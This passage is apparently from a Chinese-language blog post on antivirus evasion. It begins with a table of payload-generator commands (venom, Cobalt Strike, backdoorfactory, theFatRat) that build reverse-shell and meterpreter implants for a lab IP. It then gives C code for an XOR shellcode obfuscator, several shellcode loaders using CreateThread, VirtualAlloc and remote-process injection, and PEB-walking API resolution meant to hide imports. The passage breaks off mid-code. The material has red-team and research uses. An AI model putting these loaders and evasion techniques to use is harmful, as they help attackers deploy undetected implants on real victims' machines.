<td>2     16     192.168.43.128     51045     windows/meterpreter/reverse_winhttps     51045</td>
</tr>
<tr>
<td>venom</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>2     17     192.168.43.128     51046     3     windows/meterpreter/reverse_http     51046</td>
</tr>
<tr>
<td>venom</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>2     18     The full path of your agent.exe     192.168.43.128     51047     windows/shell/reverse_tcp</td>
</tr>
<tr>
<td>venom</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>2     18     The full path of your csc-v4.0.30319x86.exe     192.168.43.128     51048     windows/meterpreter/reverse_tcp</td>
</tr>
<tr>
<td>venom</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>√</td>
<td>2     19     192.168.43.128     51049     windows/meterpreter/reverse_tcp</td>
</tr>
<tr>
<td>venom</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>√</td>
<td>2     19     192.168.43.128     51050     windows/meterpreter/reverse_winhttps</td>
</tr>
<tr>
<td>venom</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>venom-20</td>
</tr>
<tr>
<td>cobaltstrike</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>ColbaltStrike&gt;Listeners&gt;Add&gt;”windows/beacon_http/reverse_http;Port  51052”     Attacks&gt;Packages&gt;Windows Execuation&gt;Windows EXE</td>
</tr>
<tr>
<td>cobaltstrike</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>ColbaltStrike&gt;Listeners&gt;Add&gt;”windows/beacon_https/reverse_https;Port  51053”     Attacks&gt;Packages&gt;Windows Execuation&gt;Windows EXE</td>
</tr>
<tr>
<td>cobaltstrike</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>ColbaltStrike&gt;Listeners&gt;Add&gt;”windows/beacon_http/reverse_http;Port  51054”     Attacks&gt;Packages&gt;Windows Execuation(stageless)&gt;Windows EXE</td>
</tr>
<tr>
<td>cobaltstrike</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>ColbaltStrike&gt;Listeners&gt;Add&gt;”windows/beacon_https/reverse_https;Port  51055”     Attacks&gt;Packages&gt;Windows Execuation(stageless)&gt;Windows EXE</td>
</tr>
<tr>
<td>cobaltstrike</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>ColbaltStrike&gt;Listeners&gt;Add&gt;”windows/beacon_http/reverse_http;Port  51056”     Attacks&gt;Packages&gt;Windows Execuation&gt;Windows Service EXE</td>
</tr>
<tr>
<td>cobaltstrike</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>ColbaltStrike&gt;Listeners&gt;Add&gt;”windows/beacon_https/reverse_https;Port  51057”     Attacks&gt;Packages&gt;Windows Execuation&gt;Windows Service EXE</td>
</tr>
<tr>
<td>cobaltstrike</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>ColbaltStrike&gt;Listeners&gt;Add&gt;”windows/beacon_http/reverse_http;Port  51058”     Attacks&gt;Packages&gt;Windows Execuation(stageless)&gt;Windows Service EXE</td>
</tr>
<tr>
<td>cobaltstrike</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>ColbaltStrike&gt;Listeners&gt;Add&gt;”windows/beacon_https/reverse_https;Port  51059”     Attacks&gt;Packages&gt;Windows Execuation(stageless)&gt;Windows Service EXE</td>
</tr>
<tr>
<td>cobaltstrike</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>ColbaltStrike&gt;Listeners&gt;Add&gt;”windows/beacon_http/reverse_http;Port  51060”     Attacks&gt;Packages&gt;Windows Execuation(stageless)&gt;powershell</td>
</tr>
<tr>
<td>cobaltstrike</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>ColbaltStrike&gt;Listeners&gt;Add&gt;”windows/beacon_https/reverse_https;Port  51061”     Attacks&gt;Packages&gt;Windows Execuation(stageless)&gt;powershell</td>
</tr>
<tr>
<td>backdoorfactory</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>./backdoor.py -f  workspace/calc.exe -s cave_miner_inline -J -H 192.168.43.128 -P 51062 -o 51062.exe     9     10     11</td>
</tr>
<tr>
<td>theFatRat</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>proxychains ./fatrat               2     [ 1 ] - Powerstager 0.2.5 by z0noxz (powershell) (NEW)     192.168.43.128     51063     51063     2     access.ico</td>
</tr>
<tr>
<td>theFatRat</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>proxychains ./fatrat               2     [ 2 ] - slow but useful     192.168.43.128     51064     51064     2</td>
</tr>
<tr>
<td>theFatRat</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>√</td>
<td>proxychains ./fatrat          6     1     192.168.43.128     51065     51065     2 windows/shell/reverse_tcp</td>
</tr>
<tr>
<td>theFatRat</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>√</td>
<td>proxychains ./fatrat          6     1     192.168.43.128     51066     51066     3 windows/meterpreter/reverse_tcp</td>
</tr>
<tr>
<td>theFatRat</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>proxychains ./fatrat          6     2     192.168.43.128     51067     51067     2 windows/shell/reverse_tcp</td>
</tr>
<tr>
<td>theFatRat</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>proxychains ./fatrat          6     2     192.168.43.128     51068     51068     3 windows/meterpreter/reverse_tcp</td>
</tr>
<tr>
<td>theFatRat</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>proxychains ./fatrat          6     3     192.168.43.128     51069     51069     6 windows/meterpreter/reverse_https</td>
</tr>
<tr>
<td>theFatRat</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>proxychains ./fatrat          6     4     192.168.43.128     51070     51070     3 windows/meterpreter/reverse_tcp</td>
</tr>
<tr>
<td>theFatRat</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>proxychains ./fatrat          6     5     192.168.43.128     51071     51071     2 windows/shell/reverse_tcp</td>
</tr>
<tr>
<td>theFatRat</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>proxychains ./fatrat          6     7     192.168.43.128     51072     51072     #2 windows/shell/reverse_tcp</td>
</tr>
</tbody></table>
<h2 id="0x02-定制与开发"><a href="#0x02-定制与开发" class="headerlink" title="0x02 定制与开发"></a>0x02 定制与开发</h2><p>下面给出一些在实战shellcode加载类免杀中用到的一些免杀tips。这里不会给出具体的代码，而是给出一些模块的实现思想，将这些模块进行简单组合就能达到不错的免杀效果。而这些模块的开发与实现成本非常低。</p>
<h3 id="1-文件免杀"><a href="#1-文件免杀" class="headerlink" title="1 文件免杀"></a>1 文件免杀</h3><h4 id="1-1-shellcode混淆器"><a href="#1-1-shellcode混淆器" class="headerlink" title="1.1 shellcode混淆器"></a>1.1 shellcode混淆器</h4><p>shellcode混淆器用于“源码编译类的小远控”场景下中掩盖stager内shellcode的静态特征。</p>
<p>shellcode混淆器的开发成本非常低，可以采用自定义的编码算法对原有shellcode进行混淆，进而掩盖原生shellcode内的静态特征。</p>
<ul>
<li>下面给出一个简单的异或混淆器demo。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#混淆器</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* raw_buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (size - <span class="number">1</span>); i++) &#123;</span><br><span class="line">        ......</span><br><span class="line">        raw_buf[i] = raw_buf[i] ^ raw_buf[j] + (<span class="keyword">unsigned</span> <span class="keyword">char</span>)size;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#解混淆器</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">y</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* raw_buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = size - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        ......</span><br><span class="line">        raw_buf[i] = raw_buf[i] ^ raw_buf[j] + (<span class="keyword">unsigned</span> <span class="keyword">char</span>)size;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-2-加载器"><a href="#1-2-加载器" class="headerlink" title="1.2 加载器"></a>1.2 加载器</h4><p>“源码编译类的小远控”场景下加载器的实现方式非常多，目前收集了一些C语言下的常见加载器。可以简单将他们分成以下3类：</p>
<h5 id="1-2-1-函数指针加载器"><a href="#1-2-1-函数指针加载器" class="headerlink" title="1.2.1 函数指针加载器"></a>1.2.1 函数指针加载器</h5><h6 id="函数指针型加载器"><a href="#函数指针型加载器" class="headerlink" title="# 函数指针型加载器"></a># 函数指针型加载器</h6><p>下面是一个最简单的C语言函数指针型加载器。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func_p01nt3r_1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> (*func)();</span><br><span class="line">    func = (<span class="keyword">void</span> (*)()) (<span class="keyword">void</span>*)raw_buf;</span><br><span class="line">    (<span class="keyword">void</span>)(*func)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="1-2-2-线程创建类加载器"><a href="#1-2-2-线程创建类加载器" class="headerlink" title="1.2.2 线程创建类加载器"></a>1.2.2 线程创建类加载器</h5><p>此类加载器基本遵循以下流程：</p>
<p>**step 1.**shellcode复制到申请的内存页上。</p>
<p>**step 2.**设置内存页的权限位上加上可执行权限。</p>
<p>**step 3 .**使用线程创建类函数直接执行该内存块上的内容。</p>
<h6 id="CreateThread加载器-1"><a href="#CreateThread加载器-1" class="headerlink" title="# CreateThread加载器-1"></a># CreateThread加载器-1</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cr34te_thr34d_1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//#include &lt;windows.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">    LPVOID lpvAddr = (LPVOID)<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">memset</span>(lpvAddr, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(lpvAddr, raw_buf, <span class="keyword">sizeof</span>(raw_buf));</span><br><span class="line">    DWORD pa = <span class="number">0x01</span>;</span><br><span class="line">    VirtualProtect(lpvAddr, <span class="keyword">sizeof</span>(raw_buf), PAGE_EXECUTE_READWRITE, &amp;pa);<span class="comment">//PAGE_EXECUTE</span></span><br><span class="line">    <span class="keyword">if</span> (lpvAddr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        HANDLE s;</span><br><span class="line">        s = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        WaitForSingleObject(s, INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="CreateThread加载器-2"><a href="#CreateThread加载器-2" class="headerlink" title="# CreateThread加载器-2"></a># CreateThread加载器-2</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cr34te_thr34d_2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//#include &lt;windows.h&gt;</span></span><br><span class="line">    LPVOID lpvAddr = VirtualAlloc(<span class="number">0</span>, <span class="number">1024</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    RtlMoveMemory(lpvAddr, raw_buf, <span class="keyword">sizeof</span>(raw_buf));</span><br><span class="line">    DWORD pa = <span class="number">0x01</span>;</span><br><span class="line">    VirtualProtect(lpvAddr, <span class="keyword">sizeof</span>(raw_buf), <span class="number">0x10</span>, &amp;pa);</span><br><span class="line">    <span class="keyword">if</span> (lpvAddr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        HANDLE s;</span><br><span class="line">        s = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        WaitForSingleObject(s, INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="CreateThread加载器-3"><a href="#CreateThread加载器-3" class="headerlink" title="# CreateThread加载器-3"></a># CreateThread加载器-3</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cr34te_thr34d_3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE heap;</span><br><span class="line">    heap = (<span class="keyword">int</span>*)HeapCreate(<span class="number">0</span>, <span class="number">0x00</span>, <span class="number">0xfff</span>);</span><br><span class="line"></span><br><span class="line">    LPVOID lpvAddr;</span><br><span class="line">    lpvAddr = (LPVOID)HeapAlloc(heap, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">memset</span>(lpvAddr, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(lpvAddr, raw_buf, <span class="keyword">sizeof</span>(raw_buf));</span><br><span class="line">    DWORD pa = <span class="number">0x01</span>;</span><br><span class="line">    VirtualProtect(lpvAddr, <span class="keyword">sizeof</span>(raw_buf), PAGE_EXECUTE_READWRITE, &amp;pa);<span class="comment">//PAGE_EXECUTE</span></span><br><span class="line">    <span class="keyword">if</span> (lpvAddr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        HANDLE s;</span><br><span class="line">        s = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        WaitForSingleObject(s, INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="CreateThread加载器-4"><a href="#CreateThread加载器-4" class="headerlink" title="# CreateThread加载器-4"></a># CreateThread加载器-4</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cr34te_thr34d_4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//#include &lt;windows.h&gt;</span></span><br><span class="line">    LPVOID lpvAddr = VirtualAllocExNuma(GetCurrentProcess(), <span class="literal">NULL</span>, <span class="number">1024</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, <span class="number">0</span>);</span><br><span class="line">    RtlMoveMemory(lpvAddr, raw_buf, <span class="keyword">sizeof</span>(raw_buf));</span><br><span class="line">    DWORD pa = <span class="number">0x01</span>;</span><br><span class="line">    VirtualProtect(lpvAddr, <span class="keyword">sizeof</span>(raw_buf), <span class="number">0x10</span>, &amp;pa);</span><br><span class="line">    <span class="keyword">if</span> (lpvAddr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        HANDLE s;</span><br><span class="line">        s = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        WaitForSingleObject(s, INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了上面使用的CreateThread函数以外，理论上还有很多其他替代的函数。如”_beginThreadex”,”pthread_create”。由于没有具体测试过，就不附进来了。不同函数的组合能一定程度上对代码静态分析产生干扰达到简单的绕过。</p>
<h5 id="1-2-3-线程劫持类加载器"><a href="#1-2-3-线程劫持类加载器" class="headerlink" title="1.2.3 线程劫持类加载器"></a>1.2.3 线程劫持类加载器</h5><h6 id="VirtualAllocEx加载器-1"><a href="#VirtualAllocEx加载器-1" class="headerlink" title="# VirtualAllocEx加载器-1"></a># VirtualAllocEx加载器-1</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thr34d_h1j4ck1ng_1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// visual studio 2019</span></span><br><span class="line">    SIZE_T size = <span class="number">0</span>;</span><br><span class="line">    STARTUPINFOEXA si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    si.StartupInfo.cb = <span class="keyword">sizeof</span>(STARTUPINFOEXA);</span><br><span class="line">    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line"></span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    si.StartupInfo.cb = <span class="keyword">sizeof</span>(STARTUPINFOEXA);</span><br><span class="line">    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line"></span><br><span class="line">    InitializeProcThreadAttributeList(si.lpAttributeList, <span class="number">1</span>, <span class="number">0</span>, &amp;size);</span><br><span class="line"></span><br><span class="line">    BOOL success = CreateProcessA(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        (LPSTR)<span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">true</span>,</span><br><span class="line">        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,<span class="comment">//有扩展启动信息的结构体</span></span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="keyword">reinterpret_cast</span>&lt;LPSTARTUPINFOA&gt;(&amp;si),</span><br><span class="line">        &amp;pi);</span><br><span class="line"></span><br><span class="line">    HANDLE notepadHandle = pi.hProcess;</span><br><span class="line">    LPVOID remoteBuffer = VirtualAllocEx(notepadHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> raw_buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    WriteProcessMemory(notepadHandle, remoteBuffer, raw_buf, <span class="keyword">sizeof</span> raw_buf, <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE remoteThread = CreateRemoteThread(notepadHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WaitForSingleObject(remoteThread, INFINITE) == WAIT_FAILED) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ResumeThread(pi.hThread) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="VirtualAllocEx加载器-2"><a href="#VirtualAllocEx加载器-2" class="headerlink" title="# VirtualAllocEx加载器-2"></a># VirtualAllocEx加载器-2</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thr34d_h1j4ck1ng_2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE p = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID lpvAddr = VirtualAllocEx(GetCurrentProcess(), <span class="number">0</span>, <span class="number">1024</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    RtlMoveMemory(lpvAddr, raw_buf, <span class="keyword">sizeof</span>(raw_buf));</span><br><span class="line">    DWORD pa = <span class="number">0x01</span>;</span><br><span class="line">    VirtualProtect(lpvAddr, <span class="keyword">sizeof</span>(raw_buf), <span class="number">0x10</span>, &amp;pa);</span><br><span class="line">    <span class="keyword">if</span> (lpvAddr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        HANDLE s;</span><br><span class="line">        s = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        WaitForSingleObject(s, INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="1-2-4-动态函数寻址加载器"><a href="#1-2-4-动态函数寻址加载器" class="headerlink" title="1.2.4 动态函数寻址加载器"></a>1.2.4 动态函数寻址加载器</h5><p>不论PE文件还是ELF文件都有导入表的说法，导入表内的内容与程序内使用的各种外部API函数息息相关。因而，不少杀毒软件也通过分析导入表来判断程序是否存在潜在的恶意特征。也介于这样原因，演化一种更高级的写法，能够降低导入表内出现的函数。</p>
<h6 id="动态函数寻址加载器-1"><a href="#动态函数寻址加载器-1" class="headerlink" title="# 动态函数寻址加载器-1"></a># 动态函数寻址加载器-1</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cr34te_thr34d_dynamic_1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//#include &lt;windows.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">    LPVOID lpvAddr = (LPVOID)<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">memset</span>(lpvAddr, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(lpvAddr, raw_buf, <span class="keyword">sizeof</span>(raw_buf));</span><br><span class="line">    DWORD pa = <span class="number">0x01</span>;</span><br><span class="line">	LPVOID mVirtualProtect = GetProcAddress(LoadLibraryA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">    mVirtualProtect(lpvAddr, <span class="keyword">sizeof</span>(raw_buf), PAGE_EXECUTE_READWRITE, &amp;pa);<span class="comment">//PAGE_EXECUTE</span></span><br><span class="line">    <span class="keyword">if</span> (lpvAddr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        HANDLE s;</span><br><span class="line">        s = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        WaitForSingleObject(s, INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="动态函数寻址加载器-2"><a href="#动态函数寻址加载器-2" class="headerlink" title="# 动态函数寻址加载器-2"></a># 动态函数寻址加载器-2</h6><p>不少加壳软件中大量用到了本技术，这种技术可以彻底脱离对外部API函数的导入需求，完全通过内部寻址实现。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) <span class="function">PDWORD <span class="title">GerKernelBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax, fs: [<span class="number">0x30</span>] ;</span><br><span class="line">		mov eax, [eax + <span class="number">0x0c</span>];</span><br><span class="line">		mov eax, [eax + <span class="number">0x14</span>];</span><br><span class="line">		mov eax, [eax];</span><br><span class="line">		mov eax, [eax];</span><br><span class="line">		mov eax, [eax + <span class="number">0x10</span>];</span><br><span class="line">		ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">GetFunAddr</span><span class="params">(DWORD* DllBase, <span class="keyword">char</span>* FunName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)DllBase;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos);</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOt = 